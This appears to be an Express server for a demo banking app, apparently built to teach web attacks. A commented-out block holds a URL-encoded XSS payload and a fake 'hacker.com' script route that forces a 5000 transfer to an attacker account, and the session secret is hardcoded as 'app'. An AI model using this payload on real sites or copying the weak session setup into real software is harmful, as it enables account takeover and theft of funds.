const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const session = require('express-session')
const db = require('./db');

const crypto = require('crypto');

const randomHash = () => crypto.randomBytes(10).toString('hex');

const BUILD_PATH = path.join(__dirname, '../build');

const ONE_HOUR_MS = 1000 * 60 * 60;

const app = express();

app.set('trust proxy', 1) // trust first proxy
app.use(
  session({
    secret: "app",
    name: "app",
    resave: true,
    saveUninitialized: true,
    cookie: { maxAge: ONE_HOUR_MS }
  })
);

const IS_PROD = process.env.NODE_ENV !== 'development';
console.log('Starting for production:', IS_PROD, process.env.NODE_ENV);

app.use(express.static(BUILD_PATH));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

app.get(['/login', '/search'], (req, res) => {
  res.sendFile(path.join(BUILD_PATH, 'index.html'));
});

app.get('/user', (req, res) => {
  const { session } = req.session;
  const user = db.getUser(session);
  if (!user) {
    res.status(200).json(null);
  } else {
    res.status(200).json(user);
  }
});


// // http://localhost:3000/search?q=%3Cimg%20src%3D%22%23%22%20onerror%3D%22const%20a%3Ddocument.createElement(%27script%27)%3Ba.src%3D%27http%3A%2F%2Flocalhost:3000%2Fhacker.com%2Fxss.js%27%3Bdocument.body.appendChild(a)%3B%22%20%2F%3E
// app.get('/hacker.com/xss.js', (req, res) => {
//   res.set('Content-Type', 'application/javascript');
//   res.send (`const body=new URLSearchParams('amount=5000&description=Thank%20You&to=Bong%20Hacker');fetch('/transfer',{body,method:'post'})`)
// })

app.get('*', (req, res) => {
  res.redirect('/');
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username == null || password == null || username.length < 1 || password.length < 1) {
    return res.status(400).end();
  }
  const sessionID = db.handleLogin(username, password);
  console.log('Login success with session id =>', sessionID)

  req.session.session = sessionID;
  
  res.status(301).redirect('/');
});

app.post('/logout', (req, res) => {
  const { session } = req.session;
  
  db.logout(session);

  res.status(301).redirect('/login');
});

// Auth middleware
// Everything below this will require auth
app.use((req, res, next) => {
  const { session } = req.session;
  const user = db.getUser(session);

  if (!user) {
    return res.status(401).end();
  }
  req.user = user;
  return next();
});

app.post('/transfer', (req, res) => {
  console.log(req.body);
  const { amount, remark, username } = req.body;
  const floatAmount = parseFloat(amount);

  if (
    isNaN(floatAmount) ||
    floatAmount <= 0 ||
    remark == null ||
    remark == '' ||
    username == null ||
    username == ''
  ) {
    return res.status(400).end();
  }

  const updatedUser = db.makeTransfer(req.user, floatAmount, username, remark);
  if (updatedUser === false) {
    return res.status(401).json({ error: "You don't have enough balance.", success: false });
  }
  res.status(200).json({ user: updatedUser, success: true });
});

const port = process.env.PORT || '8001';
app.listen(port);
console.log(`Server listening on port ${port}`);
